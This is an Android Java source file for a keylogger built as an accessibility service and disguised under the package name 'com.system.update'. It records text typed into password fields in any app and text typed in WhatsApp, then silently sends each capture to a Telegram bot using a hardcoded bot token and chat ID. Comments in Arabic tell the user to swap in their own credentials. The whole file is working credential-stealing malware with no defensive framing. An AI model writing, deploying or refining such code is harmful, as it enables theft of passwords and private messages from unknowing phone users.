package com.system.update;

import android.accessibilityservice.AccessibilityService;
import android.view.accessibility.AccessibilityEvent;
import android.view.accessibility.AccessibilityNodeInfo;
import java.net.HttpURLConnection;
import java.net.URL;
import java.net.URLEncoder;

public class KeyloggerService extends AccessibilityService {
    private static final String BOT_TOKEN = "9014559285:AAEamXnqANi68FHT7mnT3DpF5hC1y9zmes4"; // غيرها
    private static final String CHAT_ID = "6978974735";     // غيرها

    @Override
    public void onAccessibilityEvent(AccessibilityEvent event) {
        if (event.getEventType() == AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED) {
            AccessibilityNodeInfo source = event.getSource();
            if (source != null && source.getText() != null) {
                String text = source.getText().toString();
                String pkg = event.getPackageName().toString();
                
                if (source.isPassword()) {
                    send("🔐 Password Captured [" + pkg + "]: " + text);
                } else if (pkg.contains("whatsapp")) {
                    send("💬 WhatsApp Keylog [" + pkg + "]: " + text);
                }
            }
        }
    }

    @Override
    public void onInterrupt() {}

    private void send(String msg) {
        new Thread(() -> {
            try {
                String urlStr = "https://api.telegram.org/bot" + BOT_TOKEN + "/sendMessage?chat_id=" + CHAT_ID + "&text=" + URLEncoder.encode(msg, "UTF-8");
                HttpURLConnection conn = (HttpURLConnection) new URL(urlStr).openConnection();
                conn.getInputStream().close();
            } catch (Exception ignored) {}
        }).start();
    }
}
